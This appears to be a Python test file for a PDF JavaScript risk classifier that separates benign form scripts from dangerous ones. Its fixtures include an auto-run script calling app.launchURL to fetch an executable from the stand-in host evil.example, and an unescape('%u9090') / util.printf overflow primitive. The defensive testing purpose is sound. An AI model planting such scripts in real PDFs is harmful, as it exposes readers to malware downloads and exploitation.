"""PDF JavaScript risk tiering (0.5.0) — benign form JS must not drive a verdict.

``/JavaScript`` is ubiquitous in benign AcroForm / government PDFs (field
calculation, formatting, viewer checks). The classifier inspects what the JS
actually does: benign form/viewer APIs → INFO; code-exec / network / exfil /
exploit primitives → keep flagged; unreadable body → fail-safe (keep flagged).
"""
from __future__ import annotations

import os
import sys

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "../src")))

from doc_firewall.analyzers.pdf.js_risk import classify_pdf_js_risk


def _pdf(body: bytes) -> bytes:
    return b"%PDF-1.6\n" + body + b"\n%%EOF\n"


class TestJsRiskClassifier:
    def test_no_javascript_is_none(self):
        assert classify_pdf_js_risk(_pdf(b"1 0 obj<</Type/Catalog>>endobj")) == "none"

    def test_benign_form_calc_js(self):
        body = (
            b"1 0 obj<</AA<</C<</S/JavaScript/JS"
            b"(AFSimple_Calculate\\('SUM', new Array\\('a','b'\\)\\); event.value = 0;)"
            b">>>>>>endobj"
        )
        assert classify_pdf_js_risk(_pdf(body)) == "benign"

    def test_benign_viewer_check_js(self):
        body = (
            b"1 0 obj<</OpenAction<</S/JavaScript/JS"
            b"(if \\(app.viewerType == 'Exchange'\\) { var needsUpdate = 0; })"
            b">>>>endobj"
        )
        assert classify_pdf_js_risk(_pdf(body)) == "benign"

    def test_dangerous_launchurl_js(self):
        body = (
            b"1 0 obj<</OpenAction<</S/JavaScript/JS"
            b"(app.launchURL\\('http://evil.example/x.exe', true\\);)"
            b">>>>endobj"
        )
        assert classify_pdf_js_risk(_pdf(body)) == "dangerous"

    def test_dangerous_exploit_primitive_js(self):
        body = (
            b"1 0 obj<</Names<</JavaScript<</Names[(x)"
            b"2 0 R]>>>>>>endobj\n"
            b"2 0 obj<</S/JavaScript/JS"
            b"(var s = unescape\\('%u9090%u9090'\\); util.printf\\('%45000f', 1\\);)"
            b">>endobj"
        )
        assert classify_pdf_js_risk(_pdf(body)) == "dangerous"

    def test_unreadable_js_is_unverified_not_benign(self):
        # /JS present but the value is an indirect ref we cannot resolve to a
        # body → must NOT be downgraded (fail-safe).
        body = b"1 0 obj<</OpenAction<</S/JavaScript/JS 99 0 R>>>>endobj"
        assert classify_pdf_js_risk(_pdf(body)) == "unverified"

    def test_font_binary_not_misread_as_dangerous(self):
        # Binary that happens to contain "eval(" / "%u9090" outside any JS body
        # must not be classified dangerous (no /JS key at all here).
        body = b"1 0 obj<</Type/Font>>stream\neval( %u9090 fromCharCode\nendstream endobj"
        assert classify_pdf_js_risk(_pdf(body)) == "none"
